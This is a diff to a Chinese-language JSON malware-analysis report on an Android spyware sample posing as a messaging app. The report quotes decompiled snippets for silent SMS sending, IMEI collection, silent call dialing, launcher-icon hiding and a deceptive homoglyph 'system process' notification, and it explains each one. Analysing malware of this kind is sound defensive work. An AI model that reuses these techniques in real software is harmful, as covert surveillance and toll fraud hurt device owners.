@@ -6,7 +6,7 @@
     "应用名": "СMC - Пoслание",
     "是否恶意": true,
     "风险等级": "高",
-    "分析耗时(秒)": 178.8
+    "分析耗时(秒)": 272.9
   },
   "行为列表": [
     {
@@ -30,7 +30,7 @@
           "risk_level": "中",
           "malicious_code_snippet": "public int onStartCommand(Intent intent, int i, int i2) {\n    a();\n    return 1;\n}",
           "malicious_code_snippet_context": "      }\n  \n      @Override // android.app.Service\n>>>     public int onStartCommand(Intent intent, int i, int i2) {\n>>>         a();\n>>>         return 1;\n>>>     }\n  }",
-          "behavior_description": "Service的onStartCommand方法被调用时执行a()方法（疑似C2通信初始化逻辑），并返回START_STICKY(1)，使系统在服务被杀死后自动重启，从而维持C2通信通道的持久化。onDestroy中取消定时任务(1126)后stopSelf，但START_STICKY机制仍会触发重启。数据流向：Service启动→a()方法（疑似发起C2连接）→START_STICKY保活",
+          "behavior_description": "该代码位于确认恶意样本（伪装成'信息'应用、滥用AccessibilityService的间谍软件）的后台Service中。onStartCommand在服务每次启动/重启时被系统回调，随即调用核心方法a()（推测为初始化与C2服务器的通信连接或注册定时轮询任务），并返回START_STICKY(1)，使服务被系统杀死后自动重建，保证恶意通信逻辑持续运行不被清除；onDestroy中取消通知(id=1126)并stopSelf，用于隐蔽清理痕迹。数据流向：系统启动Service触发onStartCommand(Intent)→调用a()执行C2通信/远控调度逻辑→返回START_STICKY实现服务保活自重启，形成'被杀→重启→再次连接C2'的持久化闭环，是维持远程控制通道的关键组件。",
           "glm_analyzed": true
         }
       ]
@@ -65,7 +65,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);",
           "malicious_code_snippet_context": "          System.out.println(\"\".trim());\n          try {\n              Retailer.a(true);\n>>>             SmsManager.getDefault().sendTextMessage(str, null, str2, pendingIntent, null);\n          } catch (Exception e) {\n          }\n      }",
-          "behavior_description": "该方法接收目标号码(str)和短信内容(str2)作为参数，直接调用 SmsManager.getDefault().sendTextMessage() 静默发送短信，无需用户交互。在恶意样本上下文中，此行为通常用于发送付费短信或向C2服务器上传数据，造成用户经济损失。数据流向：外部传入参数(str,str2) → SmsManager.sendTextMessage() 静默发送短信",
+          "behavior_description": "该方法实现静默发送短信：接收目标号码 str 和短信内容 str2 作为参数，直接调用 SmsManager.getDefault().sendTextMessage() 发送短信，全程无任何用户界面和用户确认。数据流向：外部传入的号码与短信内容（结合上文可见内容先经加密 new a().a() 再 Base64 编码，即可能为窃取的设备数据）→ sendTextMessage() 静默外发到指定号码。辅助方法 a(Context) 通过 Build.VERSION.SDK_INT < 19 或判断应用是否为默认短信应用（Telephony.Sms.getDefaultSmsPackage）来规避 Android 4.4+ 的短信权限限制。所有异常被空 catch 静默吞掉，配合混淆的类名（ru.articulate.coalition.b）和 System.out.println 垃圾填充代码，是典型的短信欺诈/短信通道数据外发行为，可直接造成用户话费损失（订阅付费短信）或隐私数据泄露，与厂商报告中伪装成 Messages 应用的恶意样本行为吻合。",
           "glm_analyzed": true
         }
       ]
@@ -92,9 +92,9 @@
           "malicious_behavior": "device_fingerprinting",
           "behavior_type": "malicious",
           "risk_level": "高",
-          "malicious_code_snippet": "jSONObject.put(\"model\", Build.MODEL);\njSONObject.put(\"android\", Build.VERSION.RELEASE);\nTelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\njSONObject.put(\"cell\", telephonyManager.getNetworkOperatorName());\njSONObject.put(\"country\", telephonyManager.getNetworkCountryIso());\nstr = telephonyManager.getDeviceId();\njSONObject.put(\"imei\", str);\na(context, 1, jSONObject);",
-          "malicious_code_snippet_context": "          try {\n              jSONObject.put(\"x\", i);\n              jSONObject.put(\"ver\", \"5.0.3\");\n>>>             jSONObject.put(\"model\", Build.MODEL);\n>>>             jSONObject.put(\"android\", Build.VERSION.RELEASE);\n>>>             TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\n>>>             jSONObject.put(\"cell\", telephonyManager.getNetworkOperatorName());\n>>>             jSONObject.put(\"country\", telephonyManager.getNetworkCountryIso());\n>>>             try {\n>>>                 str = telephonyManager.getDeviceId();\n>>>             } catch (Exception e) {\n                  str = \"000000000000001\";\n              }\n              jSONObject.put(\"imei\", str);",
-          "behavior_description": "代码通过Build.MODEL和Build.VERSION.RELEASE获取设备型号和系统版本，通过TelephonyManager获取网络运营商名称、网络国家代码以及设备IMEI（getDeviceId），将所有采集的设备指纹信息打包成JSONObject后，调用a(context,1,jSONObject)将数据外发，属于恶意样本中的隐私窃取行为，数据流向为：TelephonyManager/Build → JSONObject → a()外发",
+          "malicious_code_snippet": "jSONObject.put(\"model\", Build.MODEL);\njSONObject.put(\"android\", Build.VERSION.RELEASE);\nTelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\njSONObject.put(\"cell\", telephonyManager.getNetworkOperatorName());\njSONObject.put(\"country\", telephonyManager.getNetworkCountryIso());\ndeviceId = telephonyManager.getDeviceId();\njSONObject.put(\"imei\", deviceId);\na(context, 1, jSONObject);",
+          "malicious_code_snippet_context": "          try {\n              jSONObject.put(\"x\", i);\n              jSONObject.put(\"ver\", \"5.0.3\");\n>>>             jSONObject.put(\"model\", Build.MODEL);\n>>>             jSONObject.put(\"android\", Build.VERSION.RELEASE);\n>>>             TelephonyManager telephonyManager = (TelephonyManager) context.getSystemService(\"phone\");\n>>>             jSONObject.put(\"cell\", telephonyManager.getNetworkOperatorName());\n>>>             jSONObject.put(\"country\", telephonyManager.getNetworkCountryIso());\n>>>             try {\n>>>                 deviceId = telephonyManager.getDeviceId();\n>>>             } catch (Exception e) {\n                  deviceId = \"000000000000001\";\n              }\n              jSONObject.put(\"imei\", deviceId);",
+          "behavior_description": "该代码采集设备指纹信息：通过 Build 类获取设备型号与 Android 系统版本，通过 TelephonyManager 获取网络运营商名称、网络国家码，并调用 getDeviceId() 窃取设备 IMEI（获取失败时回退为硬编码值\"000000000000001\"以继续上报）。所有敏感数据被组装进 JSONObject（含版本号\"5.0.3\"等控制字段），随后通过 a(context, 1, jSONObject) 将数据外传至远程服务器（疑似 C2）。数据流向：TelephonyManager.getDeviceId()/Build 静态字段 → JSONObject 组装 → 网络上传。结合厂商报告确认该样本为伪装成短信应用、利用 AccessibilityService 隐藏自身并监视受害者的间谍软件，此设备指纹采集用于受害者唯一标识、画像构建与追踪，属于恶意隐私窃取行为。",
           "glm_analyzed": true
         }
       ]
@@ -125,9 +125,9 @@
           "malicious_behavior": "persistence",
           "behavior_type": "malicious",
           "risk_level": "中",
-          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    ((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"ru.articulate.coalition.SECOND\", \"Fund\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"ru.articulate.coalition.SECOND\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Cиcтемный прoцecс\").setContentText(\"Сиcтeма нe кoррeктно работает, вам необходимo включить доcтуп к cтaтистике для 'Cиcтемный прoцecс'\").setWhen(System.currentTimeMillis());\nstartForeground(1126, builder.build());",
-          "malicious_code_snippet_context": "  \n      private void a() {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             ((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"ru.articulate.coalition.SECOND\", \"Fund\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"ru.articulate.coalition.SECOND\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(R.drawable.ic_dialog_info).setContentTitle(\"Cиcтемный прoцecс\").setContentText(\"Сиcтeма нe кoррeктно работает, вам необходимo включить доcтуп к cтaтистике для 'Cиcтемный прoцecс'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(1126, builder.build());\n      }\n  \n      @Override // android.app.Service",
-          "behavior_description": "该代码在Service中通过startForeground启动前台服务实现持久化保活。关键恶意特征在于通知标题使用西里尔字母混淆伪装为'Cиcтемный прoцecс'（系统进程），通知内容以社会工程学话术欺骗用户（声称'系统未正确工作，需启用统计访问权限'），诱导用户授予额外权限。这种伪装系统进程+前台服务保活的组合是恶意软件维持后台运行的典型手法，确保恶意服务不被系统杀死，持续执行恶意任务。",
+          "malicious_code_snippet": "if (Build.VERSION.SDK_INT >= 26) {\n    ((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"ru.articulate.coalition.SECOND\", \"Fund\", 1));\n    builder = new Notification.Builder(getApplicationContext(), \"ru.articulate.coalition.SECOND\");\n} else {\n    builder = new Notification.Builder(getApplicationContext());\n}\nbuilder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Cиcтемный прoцecс\").setContentText(\"Сиcтeма нe кoррeктно работает, вам необходимo включить доcтуп к cтaтистике для 'Cиcтемный прoцecс'\");\nstartForeground(1126, builder.build());",
+          "malicious_code_snippet_context": "  \n      private void a() {\n          Notification.Builder builder;\n>>>         if (Build.VERSION.SDK_INT >= 26) {\n>>>             ((NotificationManager) getSystemService(\"notification\")).createNotificationChannel(new NotificationChannel(\"ru.articulate.coalition.SECOND\", \"Fund\", 1));\n>>>             builder = new Notification.Builder(getApplicationContext(), \"ru.articulate.coalition.SECOND\");\n>>>         } else {\n>>>             builder = new Notification.Builder(getApplicationContext());\n>>>         }\n>>>         builder.setSmallIcon(android.R.drawable.ic_dialog_info).setContentTitle(\"Cиcтемный прoцecс\").setContentText(\"Сиcтeма нe кoррeктно работает, вам необходимo включить доcтуп к cтaтистике для 'Cиcтемный прoцecс'\").setWhen(System.currentTimeMillis());\n>>>         startForeground(1126, builder.build());\n      }\n  \n      @Override // android.app.Service",
+          "behavior_description": "该代码位于恶意样本的 Service 组件中，通过 createNotificationChannel 创建通知渠道后，构造一条伪装成'系统进程'的欺骗性通知：标题和正文使用西里尔字母同形字（如'и''o''e'）与拉丁字母混排以规避安全检测，通知文案'系统运行不正常，需开启统计访问权限'是社会工程学诱导话术，诱骗用户为恶意软件授予 AccessibilityService 等危险权限。随后调用 startForeground(1126, builder.build()) 将恶意服务提升为前台服务，利用前台服务的高进程优先级避免被系统内存回收或任务管理器查杀，实现恶意进程持久化保活，为该间谍软件（Zscaler 报告确认其滥用 AccessibilityService 窃取数据）提供持续运行环境。数据流向：本地硬编码的伪造系统通知文案→Notification.Builder 构造→startForeground() 前台服务保活，无外部隐私数据输入，属于支撑恶意主体运行的持久化模块。",
           "glm_analyzed": true
         }
       ]
@@ -162,7 +162,7 @@
           "risk_level": "高",
           "malicious_code_snippet": "Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\nintent.addFlags(268435456);\ncontext.startActivity(intent);",
           "malicious_code_snippet_context": "      private static int b(Context context, String str) {\n          try {\n              Retailer.a(true);\n>>>             Intent intent = new Intent(\"android.intent.action.CALL\", Uri.parse(\"tel:\" + str));\n>>>             intent.addFlags(268435456);\n>>>             context.startActivity(intent);\n              return 0;\n          } catch (Exception e) {\n              return 6;",
-          "behavior_description": "代码使用 ACTION_CALL（非 ACTION_DIAL）直接发起电话呼叫，无需用户交互即可拨号。电话号码 str 作为方法参数传入，经 Uri.parse(\"tel:\" + str) 构造后，通过 context.startActivity() 直接触发通话。FLAG_ACTIVITY_NEW_TASK（0x10000000）确保在 IntentService 等非 Activity 上下文中也能启动呼叫。在已确认的恶意样本中，此行为通常用于静默拨打高额费率号码或进行语音钓鱼，直接造成用户经济损失。",
+          "behavior_description": "该代码位于 IntentService 后台服务中，构造 ACTION_CALL Intent，将传入的电话号码字符串 str 拼接为 tel: URI，并添加 FLAG_ACTIVITY_NEW_TASK (0x10000000) 标志后直接调用 startActivity() 发起通话。与 ACTION_DIAL（仅调起拨号界面等待用户确认）不同，ACTION_CALL 无需用户交互即可直接拨打电话。结合该样本为伪装成短信应用、滥用 AccessibilityService 的恶意软件，电话号码参数 str 由 onHandleIntent 分发的指令（疑似 C2 远程下发）提供，实现静默拨打指定号码/高额付费号码的话费欺诈，直接造成用户经济损失。",
           "glm_analyzed": true
         }
       ]
@@ -185,10 +185,10 @@
           "method_signature": "c(Context context)",
           "malicious_behavior": "icon_hiding",
           "behavior_type": "malicious",
-          "risk_level": "中",
+          "risk_level": "高",
           "malicious_code_snippet": "context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) Speed.class), 2, 1);",
           "malicious_code_snippet_context": "  \n      public static void c(Context context) {\n          System.out.println(\"\".trim());\n>>>         context.getPackageManager().setComponentEnabledSetting(new ComponentName(context, (Class<?>) Speed.class), 2, 1);\n      }\n  \n      public static ArrayList<String[]> d(Context context) {",
-          "behavior_description": "代码通过 PackageManager.setComponentEnabledSetting 将 Speed 组件（通常为应用主启动 Activity）设置为禁用状态（COMPONENT_ENABLED_STATE_DISABLED=2），使应用图标从启动器中隐藏。这是恶意软件常用的图标隐藏技术，安装后隐蔽自身存在，使用户难以发现和卸载，为后续后台恶意行为提供掩护。",
+          "behavior_description": "该方法通过 PackageManager.setComponentEnabledSetting 将应用入口组件（Speed 类，通常为启动 Activity）设置为 COMPONENT_ENABLED_STATE_DISABLED（参数 2），使应用图标从桌面启动器中消失，用户无法看到也无法正常卸载该应用。这与厂商报告中该恶意软件伪装成短信应用、利用 AccessibilityService 后'隐藏自身以监视受害者'的行为完全吻合。同类中还存在每 60 秒重复的 AlarmManager 保活机制（方法 b）以及读取通讯录联系人（方法 d），图标隐藏配合保活和隐私窃取构成典型的间谍类恶意行为链。",
           "glm_analyzed": true
         }
       ]
@@ -201,7 +201,7 @@
     "JADX反编译": "完整",
     "LLM语义分析": "已执行",
     "LLM交叉验证": "已执行",
-    "验证模型": "qwen3.7-plus",
+    "验证模型": "qwen3.8",
     "局限性": [
       "C2服务器.是否活跃: 需动态分析",
       "C2服务器.轮询间隔(秒): 需动态分析"
